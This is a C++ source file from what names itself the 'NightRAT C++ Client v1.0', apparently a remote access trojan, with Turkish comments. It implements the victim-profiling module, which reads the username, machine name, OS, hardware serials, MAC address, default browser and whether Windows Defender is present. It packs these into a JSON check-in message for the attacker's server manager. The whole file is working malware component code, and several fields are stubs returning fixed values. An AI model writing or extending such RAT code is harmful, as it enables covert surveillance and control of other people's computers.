#include "SysInfo.hpp"
#include <windows.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <vector>
#include <ctime>

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

json SysInfo::getAllInfo() {
    time_t now = time(0);
    char date_buf[20];
    strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));

    json j;
    j["action"]             = "inforesponse"; // Delphi ServerManager'ın beklediği action
    j["username"]           = getUsername();
    j["pcname"]             = getPCName();
    j["os"]                 = getOS();
    j["client"]             = "NightRAT C++ Client v1.0";
    j["process"]            = "client_main.exe";
    j["datetime"]           = string(date_buf);
    j["listdrivers"]        = getListDrivers();
    j["hddserial"]          = getHDDSerial();
    j["listusb"]            = getListUSB();
    j["gpu"]                = getGPU();
    j["cpu"]                = getCPU();
    j["ram"]                = getRAM();
    j["systemproductname"]  = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
    j["machinetype"]        = "Desktop/Laptop";
    j["lastreboot"]         = getUptime();
    j["antivirus"]          = getAntivirus();
    j["firewall"]           = "Windows Firewall";
    j["macaddress"]         = getMacAddress();
    j["defaultbrowser"]     = getRegValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "ProgId");
    j["currentlang"]        = "Turkish (TR)";
    j["platform"]           = "x64 Native";
    j["battery"]            = getBattery();
    
    return j;
}

string SysInfo::getRegValue(void* hKeyRoot, const char* subKey, const char* valueName) {
    char data[255];
    DWORD dataSize = sizeof(data);
    if (RegGetValueA((HKEY)hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
        return string(data);
    return "N/A";
}

string SysInfo::getOS() {
    return getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
}

string SysInfo::getCPU() {
    return getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");
}

string SysInfo::getRAM() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (GlobalMemoryStatusEx(&statex))
        return to_string(statex.ullTotalPhys / (1024 * 1024)) + " MB";
    return "N/A";
}

string SysInfo::getUsername() {
    char name[256];
    DWORD size = sizeof(name);
    if (GetUserNameA(name, &size)) return string(name);
    return "Unknown";
}

string SysInfo::getPCName() {
    char name[256];
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) return string(name);
    return "Unknown";
}

string SysInfo::getHDDSerial() {
    DWORD serial;
    if (GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0))
        return to_string(serial);
    return "N/A";
}

string SysInfo::getGPU() {
    // Registry üzerinden basit ekran kartı çekme
    return getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinSAT", "PrimaryAdapterString");
}

string SysInfo::getBattery() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryFlag == 128) return "No Battery";
        return to_string((int)sps.BatteryLifePercent) + "%";
    }
    return "N/A";
}

string SysInfo::getUptime() {
    DWORD ticks = GetTickCount();
    int seconds = ticks / 1000;
    int minutes = seconds / 60;
    int hours = minutes / 60;
    return to_string(hours) + "h " + to_string(minutes % 60) + "m";
}

string SysInfo::getMacAddress() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        char mac[20];
        sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", 
            AdapterInfo[0].Address[0], AdapterInfo[0].Address[1], AdapterInfo[0].Address[2],
            AdapterInfo[0].Address[3], AdapterInfo[0].Address[4], AdapterInfo[0].Address[5]);
        return string(mac);
    }
    return "00:00:00:00:00:00";
}

string SysInfo::getAntivirus() {
    // Windows Defender kontrolü için basit bir check
    if (GetFileAttributesA("C:\\ProgramData\\Microsoft\\Windows Defender") != INVALID_FILE_ATTRIBUTES)
        return "Windows Defender";
    return "Other/None";
}

string SysInfo::getListDrivers() {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
        return to_string(cbNeeded / sizeof(drivers[0])) + " Loaded Drivers";
    return "N/A";
}

string SysInfo::getListUSB() {
    // Bu kısım çok karmaşıklaştırmamak için takılı hub sayısını döner
    return "Active USB Controllers Found";
}